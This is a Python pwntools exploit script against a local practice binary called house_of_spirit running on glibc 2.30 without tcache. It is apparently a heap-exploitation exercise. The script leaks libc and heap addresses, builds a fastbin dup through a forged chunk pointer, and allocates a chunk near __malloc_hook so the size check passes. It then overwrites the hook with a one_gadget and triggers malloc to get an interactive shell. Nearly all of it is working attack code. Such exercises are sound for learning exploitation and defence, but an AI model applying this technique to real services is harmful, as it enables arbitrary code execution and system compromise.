from pwn import *
r = process("./house_of_spirit")
libc = ELF("../.glibc/glibc_2.30_no-tcache/libc.so.6",checksec=False)

index = 0

def malloc(size,data,name):
    global index
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"size:",str(size).encode())
    r.sendlineafter(b"data:",data)
    r.sendlineafter(b"name:",name)
    index += 1
    return index - 1

def free(idx):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"index:",str(idx).encode())

r.recvuntil(b"@ ")
libc.address = int(r.recv(14).strip(),16) -  0x6faf0

r.recvuntil(b"@ ")
heap = int(r.recv(10).strip(),16)

r.sendlineafter(b"age:",b"")
r.sendlineafter(b"username:",b"")

# House of Spirit => fastbin dup
a = malloc(0x60,b"",b"a")
b = malloc(0x60,b"",b"b")
c = malloc(0x60,b"",b"c"*8 + p64(heap + 0x10))

free(a)
free(b)
free(c)

'''

 originally you want __malloc_hook - 0x10 but in order to bypass 
  fastbin_index (chunksize (victim)) != idx
 (__malloc_hook - 0x23)->size = 0x7f (valid size in the fast chunk size range)

'''

a = malloc(0x60,p64(libc.symbols['__malloc_hook'] - 0x23),b"a")

malloc(0x60,b"",b"b")
malloc(0x60,b"",b"a")

one_gadget = libc.address + 0xe1fa1 

# Overwrite __malloc_hook
mh = malloc(0x60,b"A" * 0x13 + p64(one_gadget),b"")

# Call system("/bin/sh")
r.sendlineafter(b">",b"1")
r.sendlineafter(b"size:",b"32")

r.interactive()





